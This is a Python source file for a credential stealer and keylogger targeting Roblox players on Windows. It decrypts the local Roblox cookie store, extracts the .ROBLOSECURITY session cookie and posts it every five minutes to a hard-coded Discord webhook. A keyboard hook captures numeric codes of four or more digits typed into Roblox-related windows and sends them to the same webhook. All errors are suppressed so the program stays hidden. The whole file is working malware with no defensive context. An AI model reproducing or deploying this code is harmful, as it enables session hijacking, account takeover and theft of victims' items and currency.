import json
import base64
import shutil
import win32crypt
import requests
import pyperclip
import keyboard
import win32gui
import threading
from datetime import datetime
import time

WEBHOOK = "https://discord.com/api/webhooks/1407511761887957002/bqxMWYUC8zln6VXc5viAbglX3N_WHPNaxF7Bn0qUrcQUq5BstMp6aBHDroDKDvxYx0NY"

TARGET_WINDOWS = ["roblox", "fishtrap", "bloxtrap", "voidtrap"]

pending_digits = ""
last_digit_time = 0
timer_active = False

def send_roblox_cookie_to_webhook(cookie_data):
    try:
        prefixed_cookie = f"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_{cookie_data}"
        pyperclip.copy(prefixed_cookie)
        pyperclip.copy("")
        payload = {
            "content": "**Roblox Cookie Captured**\\n```\\n" + prefixed_cookie + "\\n```",
            "username": "Roblox Cookie Grabber",
            "avatar_url": "https://i.imgur.com/4M34hi2.png"
        }
        requests.post(WEBHOOK, json=payload, headers={"Content-Type": "application/json"}, timeout=10)
    except:
        pass

def retrieve_roblox_cookies():
    try:
        user_profile = os.getenv("USERPROFILE")
        if not user_profile:
            return

        roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")
        
        if not os.path.exists(roblox_cookies_path):
            return
        
        temp_dir = os.getenv("TEMP")
        if not temp_dir:
            return
            
        temp_file = f"RobloxCookies_{datetime.now().strftime('%Y%m%d_%H%M%S')}.dat"
        destination_path = os.path.join(temp_dir, temp_file)
        
        try:
            shutil.copy(roblox_cookies_path, destination_path)
        except:
            return

        try:
            with open(destination_path, 'r', encoding='utf-8') as file:
                file_content = json.load(file)
        except:
            if os.path.exists(destination_path):
                os.remove(destination_path)
            return
        finally:
            if os.path.exists(destination_path):
                try:
                    os.remove(destination_path)
                except:
                    pass

        encoded_cookies = file_content.get("CookiesData")
        if not encoded_cookies:
            return
            
        try:
            decoded = base64.b64decode(encoded_cookies)
            decrypted = win32crypt.CryptUnprotectData(decoded, None, None, None, 0)[1]
            cookies_str = decrypted.decode('utf-8', errors='ignore')
            
            for line in cookies_str.split(';'):
                if ".ROBLOSECURITY" in line:
                    send_roblox_cookie_to_webhook(line.strip())
                    return
        except:
            pass
            
    except:
        pass

def periodic_send_cookie():
    while True:
        retrieve_roblox_cookies()
        time.sleep(300)

def send_numeric_code_to_webhook(digits):
    if len(digits) >= 4:
        try:
            requests.post(WEBHOOK, json={
                "content": None,
                "embeds": [{
                    "title": "CODE DÉTECTÉ",
                    "description": f"**`{digits}`**",
                    "color": 16711680,
                    "timestamp": datetime.utcnow().isoformat()
                }],
                "username": "TrapLogger"
            })
        except:
            pass

def is_target_window():
    try:
        title = win32gui.GetWindowText(win32gui.GetForegroundWindow()).lower()
        return any(target in title for target in TARGET_WINDOWS)
    except:
        return False

def on_key(event):
    global pending_digits, last_digit_time, timer_active

    if not is_target_window():
        if len(pending_digits) >= 4:
            send_numeric_code_to_webhook(pending_digits)
        pending_digits = ""
        timer_active = False
        return

    char = event.name

    if char.isdigit():
        pending_digits += char
        last_digit_time = time.time()
        
        if not timer_active:
            timer_active = True
            threading.Thread(target=wait_and_send_digits_thread, daemon=True).start()
    else:
        if len(pending_digits) >= 4:
            send_numeric_code_to_webhook(pending_digits)
        pending_digits = ""
        timer_active = False

def wait_and_send_digits_thread():
    global timer_active, pending_digits
    start = time.time()
    
    while time.time() - start < 2.2:
        if time.time() - last_digit_time > 2.0:
            if len(pending_digits) >= 4:
                send_numeric_code_to_webhook(pending_digits)
            pending_digits = ""
            timer_active = False
            return
        time.sleep(0.05)
    
    if len(pending_digits) >= 4:
        send_numeric_code_to_webhook(pending_digits)
    pending_digits = ""
    timer_active = False

if __name__ == "__main__":
    retrieve_roblox_cookies()
    threading.Thread(target=periodic_send_cookie, daemon=True).start()
    keyboard.on_press(on_key)
    keyboard.wait()
